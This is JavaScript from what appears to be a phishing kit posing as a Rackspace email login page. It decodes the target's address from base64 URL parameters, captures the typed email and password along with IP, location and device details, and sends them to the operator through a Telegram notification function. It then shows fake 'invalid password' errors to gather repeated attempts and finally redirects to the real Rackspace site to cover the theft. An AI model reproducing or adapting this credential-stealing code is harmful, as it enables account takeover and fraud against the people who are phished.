function getBase64FromUrl() {
    const url = window.location.href;
    const urlObj = new URL(url);

    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));

    let decodedSource = '';
    let extractedSource = '';
    let decodedDevice = '';
    let extractedDevice = '';

    // Process utm_source
    if (utmSource) {
        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
        if (isBase64(base64Part)) {
            try {
                decodedSource = atob(base64Part);
            } catch (error) {
                console.error('Failed to decode Base64 string in utm_source:', error);
                decodedSource = 'Error decoding Base64 string in utm_source.';
            }
        } else {
            extractedSource = base64Part;
        }
    } else {
        extractedSource = 'utm_source parameter not found.';
    }

    // Process utm_device
    if (utmDevice) {
        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
        if (isBase64(base64PartDevice)) {
            try {
                decodedDevice = atob(base64PartDevice);
            } catch (error) {
                console.error('Failed to decode Base64 string in utm_device:', error);
                decodedDevice = 'Error decoding Base64 string in utm_device.';
            }
        } else {
            extractedDevice = base64PartDevice;
        }
    } else {
        extractedDevice = 'utm_device parameter not found.';
    }
    const combinedSource = decodedSource || extractedSource;
    const combinedDevice = decodedDevice || extractedDevice;
    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
    return combinedResult;
}

function isBase64(str) {
    try {
        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
    } catch (err) {
        return false;
    }
}

function submitRackspace() {
    const email = $('#rackspaceEmail').val().trim();
    const password = $('#rackspacePassword').val().trim();
    let valid = true;

    if (!email) {
        $('#rackspaceEmailError').text('Email is required.').show();
        valid = false;
    } else if (!validateEmail(email)) {
        $('#rackspaceEmailError').text('Please enter a valid email.').show();
        valid = false;
    }

    if (!password) {
        $('#rackspacePasswordError').text('Password is required.').show();
        valid = false;
    }

    if (valid) {
        $('.btn-primary').addClass('loading');
        $('.spinner-border').show();

        // Increment attempt count
        rackspaceAttempts++;

        // Fetch IP, location details and notify Telegram with all information
        getUserLocation(function(location) {
            const userAgent = navigator.userAgent;
            const device = isMobileDevice();
            notifyTelegram('Rackspace', email, rackspaceAttempts, password, location.ip, userAgent, device, location.city, location.region, location.country);
        });

        setTimeout(function() {
            $('.btn-primary').removeClass('loading');
            $('.spinner-border').hide();

            if (rackspaceAttempts < 3) {
                $('#rackspacePasswordError').text('Invalid email or password. Please try again.').show();
            } else {
                window.location.href = 'https://apps.rackspace.com/app'; // Redirect after 3 failed attempts
            }
        }, 1000); // 1-second delay before showing error
    }
}
